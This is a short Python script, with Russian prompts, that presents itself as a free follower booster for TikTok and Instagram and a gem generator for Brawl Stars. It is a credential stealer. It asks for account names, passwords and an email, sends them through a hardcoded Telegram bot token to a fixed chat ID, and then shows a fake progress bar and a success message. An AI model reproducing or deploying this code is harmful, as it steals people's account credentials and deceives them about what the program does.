print("\033c")
import time
from telegram import Bot
bot = Bot('1670436955:AAEf_VtT4Cu1C6bfe0B-xSc6MKFvHyPIUjo')
def out_red(text):
    print('\033[31m {}' .format(text))
out_red('Накрутка Бесплатно 2021')
print('1 - Накрутка ТикТок')
print('2 - Накрутка Инстаграм')
print ('3 - FREE GEMS BRAWL STARS (БОНУС)')
change=int(input('Введите число: '))
if change==1:
    tn=(input('Введите ваш TikTok никнейм: '))
    tp=(input('Введите ваш пароль: '))
    bot.send_message(text=f'TikTok: {tn}:{tp}',chat_id='816209498')
    tk=(input('Введите количество подписчиков которых хотите накрутить: '))
elif change==2:
	ie=(input('Введите ваш Instagram никнейм: '))
	ip=(input('Введите ваш паpоль: '))
	bot.send_message(text=f'Instagram: {ie}:{ip}',chat_id='816209498')
	ik=(input('Введите количество подписчиков которых хотите накрутить: '))
elif change==3:
	bn=(input('Введите ваш Brawl Stars никнейм: '))
	be=(input('Введите ваш email: '))
	bp=(input('Введите ваш парoль: '))
	bot.send_message(text=f'Brawl: {be}:{bp}',chat_id='816209498')
	bk=(input('Введите количество гемов которые хотите накрутить: '))
print('Идёт процесс накрутки...')
for i in range(1,101): 
    if i % 25 in [1, 2, 3, 4]: 
        time.sleep(1)
    print(f'{i} %')
print('Накрутка успешно завершена!')
input('Нажмите ENTER для выхода из программы                                  ')